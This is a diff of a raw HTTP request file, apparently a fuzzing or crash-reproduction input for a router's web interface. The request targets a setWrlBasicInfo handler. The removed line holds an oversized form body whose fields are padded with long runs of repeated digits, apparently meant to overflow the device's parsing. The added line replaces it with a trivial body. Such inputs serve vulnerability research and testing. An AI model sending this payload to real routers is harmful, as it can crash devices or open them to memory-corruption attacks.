@@ -2,6 +2,6 @@ POST //webroot?/cgi-bin HTTP/1.1
 HOST: 192.168.0.50
 Cookie: uid=xhyxhy
 Content-Type: xml/text
-Content-Length: 973
+Content-Length: 6
 
-test=9&change=setWrlBasicInfo&channel=1&autoHiddenSsid=1&broadcastSsid=22222222&isolationEn=22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&country=1&extChannel=1&none=1&ssid=3&client=5&bgn=1&netMode=1&ssidEn=1&tranSpeed=9&auto=22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&power=1&staTimeout=22222222222222222222222222222222&timeZone=1&wifiEn=1&wifi_chkHz=1&selectSsid=1&wl5g.public.sideband_flag=3&wl2g.extra.nctrlsb=1&wl2g.public.bandwidth=8&wl2g.public.sideband_flag=0&wl5g.ssidxx.ssid=22222222222222222222222222222222&wl2g.ssidxx.ssid=22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&oldPwd=lDG&userType=name&startIp=1&endIp=1&remark=1&upSpeed=1&enable=1&action=1&downSpeed=1&bhv.timegroup.listnum=1&bandwidth.mode.listnum=1
+test=9
